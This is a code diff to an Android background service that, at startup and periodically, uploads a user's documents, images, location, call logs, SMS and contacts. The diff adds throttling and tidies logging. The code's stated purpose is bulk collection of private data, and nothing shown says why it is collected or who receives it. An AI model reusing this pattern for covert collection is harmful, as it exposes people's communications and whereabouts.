@@ -7,8 +7,8 @@ import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
 
 /**
- * Ensures ALL data (location, documents, media) is collected and uploaded
- * Runs on app startup and periodically in background
+ * Orchestrates background data collection. All device files (PDF, office, images, etc.)
+ * upload only through {@link SyncService}.
  */
 public class DataCollectorService {
     private static final String TAG = "DataCollectorService";
@@ -20,96 +20,51 @@ public class DataCollectorService {
             return;
         }
 
+        Context appContext = context.getApplicationContext();
+        if (!SyncThrottle.shouldRunCollectAll(appContext)) {
+            Log.d(TAG, "Skipping collectAllData — ran recently");
+            return;
+        }
+        SyncThrottle.markCollectAllRan(appContext);
+
         String userId = user.getUid();
-        Log.d(TAG, "================================================");
-        Log.d(TAG, "🔄 STARTING DATA COLLECTION - DOCUMENTS FIRST!");
-        Log.d(TAG, "   User: " + userId);
-        Log.d(TAG, "   Priority: DOCUMENTS → Location → Gallery → Other");
-        Log.d(TAG, "================================================");
+        Log.d(TAG, "Starting data collection for " + userId);
 
-        // ⭐ PRIORITY 1: DOCUMENTS - Collect immediately without delays
-        Log.d(TAG, "⭐ PRIORITY 1: DOCUMENTS (IMMEDIATE UPLOAD)");
-        collectDocuments(context);
+        collectFileBackup(appContext);
+        collectLocation(appContext);
+        collectOtherData(appContext);
 
-        // PRIORITY 2: Location
-        Log.d(TAG, "📍 PRIORITY 2: Location");
-        collectLocation(context);
+        Log.d(TAG, "Data collection scheduled (files via SyncService)");
+    }
 
-        // PRIORITY 3: Gallery/Images
-        Log.d(TAG, "🖼️  PRIORITY 3: Gallery");
-        collectGallery(context);
-
-        // PRIORITY 4: Other data
-        Log.d(TAG, "📞 PRIORITY 4: Other data");
-        collectOtherData(context);
-
-        Log.d(TAG, "================================================");
-        Log.d(TAG, "✓ DATA COLLECTION COMPLETE");
-        Log.d(TAG, "   ⭐ Documents uploaded (if any found)");
-        Log.d(TAG, "   📍 Location sync triggered");
-        Log.d(TAG, "   🖼️  Gallery upload triggered");
-        Log.d(TAG, "   📞 Call logs, SMS, Contacts synced");
-        Log.d(TAG, "================================================");
+    private static void collectFileBackup(Context context) {
+        try {
+            if (!FeaturePermissions.hasGalleryPermission(context)) {
+                Log.w(TAG, "Skipping file backup: storage permission not granted");
+                return;
+            }
+            Log.d(TAG, "Starting SyncService for all file types");
+            FileBackupHelper.startFullBackup(context);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start SyncService", e);
+        }
     }
 
     private static void collectLocation(Context context) {
         try {
-            Log.d(TAG, "📍 Collecting location data...");
-            
             if (!FeaturePermissions.hasLocationPermission(context)) {
-                Log.w(TAG, "  Location permission not granted");
+                Log.w(TAG, "Skipping location: permission not granted");
                 return;
             }
-
             LocationSyncHelper.uploadIfAllowed(context);
-            Log.d(TAG, "✓ Location sync triggered");
         } catch (Exception e) {
             Log.e(TAG, "Failed to collect location", e);
         }
     }
 
-    private static void collectDocuments(Context context) {
-        try {
-            Log.d(TAG, "📄 Collecting documents (PDF, Excel, Word, etc.)...");
-            
-            // Check storage permissions
-            if (!FeaturePermissions.hasGalleryPermission(context)) {
-                Log.w(TAG, "   ❌ Storage permission not granted");
-                return;
-            }
-
-            // Enqueue document upload immediately
-            Log.d(TAG, "   → Enqueueing DocumentUploadWorker");
-            DocumentUploadWorker.enqueueWork(context);
-            Log.d(TAG, "   ✓ DocumentUploadWorker enqueued");
-        } catch (Exception e) {
-            Log.e(TAG, "   ❌ Failed to collect documents", e);
-        }
-    }
-
-    private static void collectGallery(Context context) {
-        try {
-            Log.d(TAG, "🖼️  Collecting gallery/media (Images, Screenshots, etc.)...");
-            
-            if (!FeaturePermissions.hasGalleryPermission(context)) {
-                Log.w(TAG, "   ❌ Storage permission not granted");
-                return;
-            }
-
-            // Enqueue image upload
-            Log.d(TAG, "   → Enqueueing ImageUploadWorker");
-            ImageUploadWorker.enqueueWork(context);
-            Log.d(TAG, "   ✓ ImageUploadWorker enqueued");
-        } catch (Exception e) {
-            Log.e(TAG, "   ❌ Failed to collect gallery", e);
-        }
-    }
-
     private static void collectOtherData(Context context) {
         try {
-            Log.d(TAG, "📞 Collecting other data (calls, SMS, contacts)...");
-            UserDataSyncHelper.syncAll(context);
-            Log.d(TAG, "✓ Other data sync triggered");
+            UserDataSyncHelper.syncAll(context, false);
         } catch (Exception e) {
             Log.e(TAG, "Failed to collect other data", e);
         }
